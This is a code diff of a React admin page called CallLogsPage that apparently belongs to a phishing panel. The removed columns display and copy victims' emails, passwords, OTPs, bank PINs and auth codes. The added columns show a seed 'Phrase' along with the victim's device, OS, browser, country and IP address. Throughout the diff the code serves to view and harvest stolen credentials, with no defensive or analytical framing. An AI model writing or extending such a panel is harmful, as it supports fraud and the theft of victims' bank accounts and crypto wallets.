@@ -338,14 +338,18 @@ function CallLogsPage() {
                           onChange={toggleSelectAll}
                         />
                       </th>
-                      {user?.role == "admin" && <th>User Name</th>}
-                      <th>Email</th>
-                      <th>Password</th>
-                      <th>OTP</th>
-                      <th>Current Step</th>
-                      <th>Bank Pin</th>
+                      {/* {user?.role == "admin" && <th>User Name</th>} */}
+                      {/* <th>Email</th> */}
+                      {/* <th>Password</th> */}
+                      {/* <th>OTP</th> */}
+                      {/* <th>Current Step</th> */}
+                      {/* <th>Bank Pin</th> */}
+                      <th>Phrase</th>
+                      <th>Device</th>
+                      <th>Operating System</th>
+                      <th>Browser</th>
                       <th>Country Flag</th>
-                      <th>Auth Code</th>
+                      {/* <th>Auth Code</th> */}
                       <th>IP Address</th>
                       <th>Date</th>
                       {/* <th>Action</th> */}
@@ -389,41 +393,44 @@ function CallLogsPage() {
                               }
                             />
                           </td>
-                          {user?.role == "admin" && (
+                          {/* {user?.role == "admin" && (
                             <td>{account?.userId?.userName}</td>
-                          )}
+                          )} */}
                           <td>
                             <div className="d-flex">
                               <div
                                 className="ms-2"
                                 onClick={() => copyToClipboard(account?.email)}
                               >
-                                <p className="fs-12 mb-0">{account?.email}</p>
+                                {/* <p className="fs-12 mb-0">{account?.email}</p> */}
+                                  {account?.phrase}
                               </div>
                             </div>
                           </td>
                           <td onClick={() => copyToClipboard(account.password)}>
-                            {account.password}
+                            {/* {account.password} */}
+                            {account?.userInfo?.device}
                           </td>
                           <td onClick={() => copyToClipboard(account.otp)}>
-                            <span
+                            {/* <span
                               className={`bg-${account?.status?.toLowerCase()}-transparent`}
                             >
                               {account.otp}
-                            </span>
+                            </span> */}
+                            {account?.userInfo?.os}
                           </td>
-                          <td
+                          {/* <td
                             onClick={() => copyToClipboard(account.currentStep)}
                           >
                             <span className="fw-semibold fs-13">
                               {account.currentStep}
                             </span>
-                          </td>
-                          <td onClick={() => copyToClipboard(account.bankPin)}>
+                          </td> */}
+                          {/* <td onClick={() => copyToClipboard(account.bankPin)}>
                             <span className="fw-semibold fs-13">
                               {account.bankPin}
                             </span>
-                          </td>
+                          </td> */}
                           <td>
                             <img
                               src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
@@ -434,9 +441,10 @@ function CallLogsPage() {
                             />
                           </td>
                           <td onClick={() => copyToClipboard(account.authCode)}>
-                            <span className="fw-semibold fs-13">
+                            {/* <span className="fw-semibold fs-13">
                               {account.authCode}
-                            </span>
+                            </span> */}
+                            {account?.userInfo?.browser}
                           </td>
                           <td
                             onClick={() =>
